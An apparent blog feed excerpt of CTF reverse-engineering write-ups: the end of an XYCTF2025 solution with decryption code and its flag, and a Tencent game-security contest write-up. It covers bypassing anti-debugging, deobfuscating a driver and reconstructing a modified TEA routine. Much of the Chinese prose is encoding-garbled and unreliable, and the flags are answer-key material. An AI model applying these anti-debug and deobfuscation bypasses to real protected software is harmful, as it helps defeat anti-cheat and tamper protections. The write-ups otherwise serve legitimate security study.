&#123;</span><br><span class="line">        <span class="number">0x5C</span>, <span class="number">0x2F</span>, <span class="number">0xD0</span>, <span class="number">0xEC</span>, <span class="number">0x82</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x57</span>,</span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x9F</span>, <span class="number">0x91</span>, <span class="number">0xF6</span>, <span class="number">0x95</span>, <span class="number">0xA4</span>, <span class="number">0xAC</span>, <span class="number">0x90</span>&#125;;</span><br><span class="line">    <span class="comment">// unsigned int key[4] = &#123;</span></span><br><span class="line">    <span class="comment">//     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x6C98B242</span>, <span class="number">0x78563412</span>, <span class="number">0x3E6A6D0D</span>, <span class="number">0xEFCDAB89</span>&#125;;</span><br><span class="line"></span><br><span class="line">    code keys_input[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        keys_input[<span class="number">2</span> * i + <span class="number">1</span>] = key[i] &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        keys_input[<span class="number">2</span> * i] = (key[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> result[<span class="number">16</span>];</span><br><span class="line">    bitset&lt;64&gt; cipher1, cipher2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cipher1[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">            cipher2[<span class="number">63</span> - (i * <span class="number">8</span> + j)] = (enc2[i + <span class="number">8</span>] &gt;&gt; (<span class="number">7</span> - j)) &amp; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">subkeys_get</span>(keys_input);</span><br><span class="line">    <span class="built_in">inv_subkeys_get</span>(sub_key);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plain1 = <span class="built_in">dencrypt</span>(cipher1);</span><br><span class="line">    bitset&lt;64&gt; plain2 = <span class="built_in">dencrypt</span>(cipher2);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> plain1_val = plain<span class="number">1.</span><span class="built_in">to_ullong</span>();</span><br><span class="line">    <span class="type">uint64_t</span> plain2_val = plain<span class="number">2.</span><span class="built_in">to_ullong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> dec2[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2, &amp;plain2_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dec2 + <span class="number">8</span>, &amp;plain1_val, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">reverse</span>(dec2, dec2 + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.16s\n&quot;</span>, dec2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{moshui_build_this_block}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF2025-é€†å‘WP&quot;&gt;&lt;a href=&quot;#XYCTF2025-é€†å‘WP&quot; class=&quot;headerlink&quot; title=&quot;XYCTF2025 é€†å‘WP&quot;&gt;&lt;/a&gt;XYCTF2025 é€†å‘WP&lt;/h1&gt;&lt;p&gt;è™½ç„¶è¿™æ¬¡å¤±å»Webæ‰‹ï¼Œä½†æ˜¯é…åˆæ–°æ¥çš„å¸ˆå‚…ï¼Œå°</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ› PCå®¢æˆ·ç«¯å®‰å…¨ åˆèµ›WP</title>
    <link href="https://tkazer.github.io/2025/03/31/2025Tencent/"/>
    <id>https://tkazer.github.io/2025/03/31/2025Tencent/</id>
    <published>2025-03-31T10:30:26.000Z</published>
    <updated>2025-03-31T10:31:52.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›-PCå®¢æˆ·ç«¯å®‰å…¨-åˆèµ›WP"><a href="#2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›-PCå®¢æˆ·ç«¯å®‰å…¨-åˆèµ›WP" class="headerlink" title="2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ› PCå®¢æˆ·ç«¯å®‰å…¨ åˆèµ›WP"></a>2025è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ› PCå®¢æˆ·ç«¯å®‰å…¨ åˆèµ›WP</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¹Ÿæ˜¯æœ¬èœé¸¡ç¬¬ä¸€æ¬¡å‚åŠ è¯¥æ¯”èµ›ï¼Œä¹‹å‰æ˜¯æœ‰çœ‹è¿‡å‰å‡ å¹´æ¯”èµ›çš„WPï¼Œæ„Ÿè§‰éš¾åº¦ä¸å°ï¼Œè¿™æ¬¡æ¥å°è¯•ä¸€ä¸‹ï¼Œç”±äºæ˜¯çº¯CTFç±»å‹ï¼Œåšèµ·æ¥è¿˜ç®—é¡ºæ‰‹ï¼Œä¸è¿‡ä¹Ÿæ˜¯é‡åˆ°ä¸å°‘é—®é¢˜ã€‚ç»è¿‡åŠå¤©çš„å¥‹æˆ˜æœ€åè¿˜æ˜¯è§£äº†å‡ºæ¥ï¼Œç»¼åˆä½“éªŒä¸‹æ¥æ”¶è·è¿˜æ˜¯ä¸å°‘çš„ã€‚</p><h2 id="R3åˆ†æ"><a href="#R3åˆ†æ" class="headerlink" title="R3åˆ†æ"></a>R3åˆ†æ</h2><p>å°†ACEFirstRound.exeæ”¾å…¥IDAåˆ†æï¼Œåœ¨mainå‡½æ•°å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè™šè¡¨ï¼Œæ ¹æ®é‡Œé¢å„ä¸ªå‡½æ•°å†…å®¹ï¼Œå°†æ¯ä¸ªè™šè¡¨å‡½æ•°éƒ½é‡æ–°å‘½åä¸ºå¯¹åº”åŠŸèƒ½ã€‚</p><p>å‘ç°æ˜¯è¿è¡Œäº†ACEDriveré©±åŠ¨ï¼Œä¸r3ç¨‹åºä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚</p><p><img src="/2025/03/31/2025Tencent/1.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/2.png" alt="alt text"></p><p>å°è¯•åŠ¨è°ƒå‘ç°æ²¡åŠæ³•ï¼Œå‘ç°ç¨‹åºé€€å‡ºï¼Œæ ¹æ®CheckRemoteDebuggerPresentçš„äº¤å‰å¼•ç”¨å‘ç°ä¸€ä¸ªåè°ƒè¯•å‡½æ•°ã€‚</p><p><img src="/2025/03/31/2025Tencent/3.png" alt="alt text"></p><p>æ‰¾è¯¥å‡½æ•°çš„äº¤å‰è°ƒç”¨ï¼Œå‘ç°æ˜¯è¿™è¾¹å¯äº†ä¸€ä¸ªçº¿ç¨‹æ¥å¯åŠ¨åè°ƒè¯•ã€‚</p><p><img src="/2025/03/31/2025Tencent/4.png" alt="alt text"></p><p>åœ¨è¯¥å‡½æ•°è¿™è¾¹è¿›è¡Œæ¡ä»¶æ–­ç‚¹ï¼Œä¿®æ”¹ripï¼Œè®©ä»£ç ç›´æ¥æ‰§è¡Œåˆ°å‡½æ•°ç»“æŸå¤„ï¼Œè·³è¿‡ä¸­é—´åè°ƒè¯•ç›¸å…³ä»£ç ï¼Œå³å¯ç»•è¿‡åè°ƒè¯•ã€‚</p><p><img src="/2025/03/31/2025Tencent/5.png" alt="alt text"></p><p>åŠ¨è°ƒåˆ†æï¼Œç„¶åè¿™è¾¹è¾“å…¥flagè¦æ±‚æ˜¯ä»¥â€ACE_â€å¼€å¤´ï¼Œç„¶åå»æ‰å‰é¢è¿™å››ä¸ªå­—ç¬¦ï¼Œé¦–å…ˆè¿›è¡ŒBase58åŠ å¯†ï¼Œç„¶åå†å°†æ•°æ®å€’è½¬ã€‚è¿™è¾¹Base58æ˜¯å˜è¡¨ï¼Œå’Œæ ‡å‡†ä¸ä¸€æ ·ï¼Œæå–å¾—ï¼š<code>abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ123456789</code></p><p><img src="/2025/03/31/2025Tencent/6.png" alt="alt text"></p><p>ä¸â€sxxâ€è¿›è¡Œå¾ªç¯xorã€‚</p><p><img src="/2025/03/31/2025Tencent/7.png" alt="alt text"></p><p>æœ€åé€šä¿¡å‘é€åˆ°ACEDriverï¼Œå‘½ä»¤ç æ˜¯0x154004ã€‚</p><p><img src="/2025/03/31/2025Tencent/8.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/9.png" alt="alt text"></p><p>è‡³æ­¤R3å±‚åˆ†æå®Œæ¯•ã€‚</p><h2 id="R0åˆ†æ"><a href="#R0åˆ†æ" class="headerlink" title="R0åˆ†æ"></a>R0åˆ†æ</h2><p>IDAè½½å…¥ACEDriver.sysï¼Œå‘ç°æœ‰å‡ ä¸ªæ¶ˆæ¯çš„Callbackï¼Œä½†æ˜¯è·³è½¬è¿‡æ¥å‘ç°æœ‰æ··æ·†å’ŒèŠ±æŒ‡ä»¤ã€‚</p><p><img src="/2025/03/31/2025Tencent/10.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/11.png" alt="alt text"></p><p>è¯¥é©±åŠ¨çš„æ··æ·†å’ŒèŠ±æŒ‡ä»¤éƒ½æ˜¯ä¸€ä¸ªç±»å‹çš„ï¼ŒèŠ±æŒ‡ä»¤æ˜¯æœ€åŸºç¡€çš„ã€‚</p><p>ä»¥ä¸‹å›¾ä¸ºä¾‹å­ï¼š</p><p>å¯¹41e9æŒ‰uå†è·³è¿‡e9å­—èŠ‚æŒ‰cè¿˜åŸï¼Œå³å¯passèŠ±æŒ‡ä»¤ã€‚</p><p><img src="/2025/03/31/2025Tencent/12.png" alt="alt text"></p><p>ç„¶åæˆªå›¾å¤„æ˜¯ä¸€å—ï¼Œå°†åœ°å€è®¡ç®—å®Œè¿›è¡Œjmpï¼Œè®¡ç®—å‡ºæ¥å®é™…å°±æ˜¯jmpåˆ°ä¸‹é¢popå¤„ï¼Œè¯´æ˜è¿™ä¸€æ®µæ˜¯æ— ç”¨çš„ï¼Œå¯ä»¥ç›´æ¥å°†pushåˆ°popå…¨éƒ¨nopå³å¯ã€‚å…¶ä»–åœ°æ–¹éƒ½å’Œè¿™åœ°æ–¹æ··æ·†å·®ä¸å¤šç±»å‹ï¼Œéƒ½ç›´æ¥è·³è¿‡èŠ±æŒ‡ä»¤ånopå³å¯ã€‚</p><p><img src="/2025/03/31/2025Tencent/13.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/14.png" alt="alt text"></p><p>ä½†æœ‰ä¸€ç§æ¯”è¾ƒç‰¹æ®Šï¼Œå¹¶ä¸æ˜¯è·³è½¬åˆ°ä¸‹é¢é‚»è¿‘ä»£ç å¤„ï¼Œè€Œæ˜¯jmpåˆ°å…¶ä»–ä»£ç å¤„ï¼Œè§‚å¯Ÿpushå’Œåº•ä¸‹popå¯„å­˜å™¨æ˜¯å¦ä¸€è‡´å°±å¯ä»¥åˆ¤æ–­æ˜¯å“ªä¸€ç§ç±»å‹ï¼Œè¯¥ç§å°±å¾—æ‰‹åŠ¨è®¡ç®—åœ°å€ç„¶åå†™jmpã€‚</p><p>æ‰‹åŠ¨å»é™¤å¤§éƒ¨åˆ†æ··æ·†åï¼Œå°±å¯ä»¥çœ‹åˆ°å‡ ä¸ªå›è°ƒçš„é‡Œé¢ä»£ç ï¼ŒMessageNotifyCallbacké‡Œé¢çš„ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2025/03/31/2025Tencent/15.png" alt="alt text"></p><p>è¿›å…¥å‡ å±‚callå°±å¯ä»¥çœ‹åˆ°è¿™è¾¹å°±æ˜¯åˆ¤æ–­å‘½ä»¤ç æ‰§è¡Œï¼Œä¸‹é¢å°±æ˜¯æ¥æ”¶R3å‘é€æ¥çš„å¯†æ–‡æ•°æ®ã€‚</p><p><img src="/2025/03/31/2025Tencent/16.png" alt="alt text"></p><p>è¿›å…¥callå‘ç°å°±æ˜¯å…³é”®å¤„ï¼Œunk_140004064é‚£è¾¹å°±æ˜¯flagå¯†æ–‡ï¼Œä½¿ç”¨çš„æ˜¯teaåŠ å¯†ï¼Œkeyæ˜¯[â€˜Aâ€™,â€™Câ€™,â€™Eâ€™,â€™6â€™]ï¼Œç„¶åè¾¹åŠ å¯†è¾¹åˆ¤æ–­å¯†æ–‡æ˜¯å¦ç›¸ç­‰ã€‚</p><p><img src="/2025/03/31/2025Tencent/17.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/18.png" alt="alt text"></p><p>æŸ¥çœ‹teaå‡½æ•°çš„äº¤å‰è°ƒç”¨ï¼Œå‘ç°æœ‰å…¶ä»–åœ°æ–¹æœ‰å‡ºç°ã€‚</p><p><img src="/2025/03/31/2025Tencent/19.png" alt="alt text"></p><p>åœ¨ç¬¬å››ä¸ªcallå¤„ï¼Œå‘ç°ä¸€ä¸ªå‡½æ•°ä¼ å…¥äº†teaåŠ å¯†çš„å‡½æ•°åœ°å€ï¼Œç„¶åè¿›è¡Œäº†ä¸€ç³»åˆ—å˜æ¢ï¼Œåº”è¯¥æ˜¯å¯¹teaå‡½æ•°æœ¬ä½“è¿›è¡Œäº†ä¿®æ”¹ã€‚</p><p><img src="/2025/03/31/2025Tencent/20.png" alt="alt text"></p><p>å°†è¯¥å‡½æ•°ä»£ç å’Œç›¸å…³æ•°æ®è¿›è¡Œæå–ï¼Œå¯¹teaå‡½æ•°å­—èŠ‚è¿›è¡Œæœ¬åœ°æ¨¡æ‹Ÿæ“ä½œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// teaå‡½æ•°åŸå­—èŠ‚</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tea[<span class="number">149</span>] = &#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xC4</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x58</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x70</span>, <span class="number">0x18</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xEA</span>, <span class="number">0x8B</span>, <span class="number">0x1A</span>, <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xDB</span>, <span class="number">0x8B</span>, <span class="number">0x7A</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0x8B</span>, <span class="number">0x72</span>, <span class="number">0x08</span>, <span class="number">0x8B</span>, <span class="number">0x6A</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0x09</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x53</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0x51</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xCA</span>, <span class="number">0x45</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>, <span class="number">0xB9</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x9E</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC2</span>, <span class="number">0x03</span>, <span class="number">0xCF</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0xC3</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x43</span>, <span class="number">0x8D</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>, <span class="number">0x05</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0xCD</span>, <span class="number">0x03</span>, <span class="number">0xC6</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x43</span>, <span class="number">0x8D</span>, <span class="number">0x04</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0xBD</span>, <span class="number">0x41</span>, <span class="number">0x5D</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> P_0[<span class="number">0x1000</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004000[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>, <span class="number">0x05</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x41</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004010[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0xC1</span>, <span class="number">0xE8</span>, <span class="number">0x0B</span>, <span class="number">0x41</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x83</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0x44</span>, <span class="number">0x85</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004020[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x03</span>, <span class="number">0xC3</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004030[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dword_140004040[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x02</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> word_140004044[<span class="number">2</span>] = &#123;</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140004046[<span class="number">2</span>] = &#123;</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> qword_140004048[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dword_140004050[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140004054[<span class="number">1</span>] = &#123;</span><br><span class="line">    <span class="number">0xE0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD64 qword_<span class="number">1400041E0</span> = <span class="number">0</span>;</span><br><span class="line">DWORD dword_<span class="number">1400041E8</span> = <span class="number">0</span>;</span><br><span class="line">BYTE byte_1400041EC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹teaå‡½æ•°ä¿®æ”¹çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_14000A35B</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n64; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">char</span>* v3; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span>* v6; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span>* v9; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64* v10; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v11; <span class="comment">// r8</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v12; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 CurrentIrql; <span class="comment">// dl</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v14; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v15; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v16; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    n64 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    v3 = (<span class="type">char</span>*)&amp;xmmword_140004020 + <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = (<span class="type">unsigned</span> __int64)(a1 + <span class="number">119</span>) &gt;&gt; i;</span><br><span class="line">        *v3++ = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = (<span class="type">char</span>*)&amp;xmmword_140004030 + <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = (<span class="type">unsigned</span> __int64)(a1 + <span class="number">52</span>) &gt;&gt; j;</span><br><span class="line">        *v6++ = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = (<span class="type">char</span>*)&amp;qword_140004048 + <span class="number">3</span>;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)P_0;</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0, xmmword_140004000, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span>, xmmword_140004010, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span> * <span class="number">2</span>, xmmword_140004020, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span> * <span 